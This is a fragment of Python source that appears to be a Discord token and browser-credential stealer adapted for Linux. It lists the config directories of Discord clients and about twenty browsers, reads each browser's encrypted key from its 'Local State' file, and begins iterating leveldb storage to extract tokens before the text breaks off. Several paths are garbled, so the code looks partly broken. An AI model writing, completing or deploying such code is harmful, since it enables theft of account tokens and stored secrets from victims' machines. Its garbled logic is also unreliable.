...
from Cryptodome.Cipher import AES  # Crypto module for Linux
...
def getTokenAndSearchForInfo():
    ...
    # Linux equivalent paths for browsers and other apps
    local_directory = os.path.expanduser("~")  # User's home directory
    chrome_directory = os.path.join(local_directory, ".config", "google-chrome", "User Data")  # Chrome on Linux
    paths = {
        'Discord': os.path.join(local_directory, ".config", "discord"),
        'Discord Canary': os.path.join(local_directory, ".config", "discordcanary"),
        'Lightcord': os.path.join(local_directory, ".config", "Lightcord"),
        'Discord PTB': os.path.join(local_directory, ".config", "discordptb"),
        'Opera': os.path.join(local_directory, ".config", "Opera Software", "Opera Stable"),
        'Opera GX': os.path.join(local_directory, ".config", "Opera Software", "Opera GX Stable"),
        'Brave': os.path.join(local_directory, ".config", "BraveSoftware", "Brave-Browser", "User Data", "Default"),
        'Iridium': os.path.join(local_directory, ".config", "Iridium", "User Data", "Default"),
        'Vivaldi': os.path.join(local_directory, ".config", "Vivaldi", "User Data", "Default"),
        'Epic Privacy Browser': os.path.join(local_directory, ".config", "Epic Privacy Browser", "User Data"),
        'Microsoft Edge': os.path.join(local_directory, ".config", "microsoft-edge", "User Data", "Default"),
        'Uran': os.path.join(local_directory, ".config", "uCozMedia", "Uran", "User Data", "Default"),
        'Yandex': os.path.join(local_directory, ".config", "Yandex", "YandexBrowser", "User Data", "Default"),
        '7Star': os.path.join(local_directory, ".config", "7Star", "7Star", "User Data"),
        'CentBrowser': os.path.join(local_directory, ".config", "CentBrowser", "User Data", "Default"),
        'Amigo': os.path.join(local_directory, ".config", "Amigo", "User Data"),
        'Torch': os.path.join(local_directory, ".config", "Torch", "User Data"),
        'Kometa': os.path.join(local_directory, ".config", "Kometa", "User Data"),
        'Orbitum': os.path.join(local_directory, ".config", "Orbitum", "User Data"),
        'Sputnik': os.path.join(local_directory, ".config", "Sputnik", "User Data"),
        'Chrome SxS': os.path.join(local_directory, ".config", "google-chrome-sxS", "User Data", "Default"),
    }

    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + "/local_directory State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
        except: continue
        
        # Token extraction logic (this can be modified depending on the browser profile structure)
        for file in listdir(path + "/local_directory/Storage/leveldb/"):
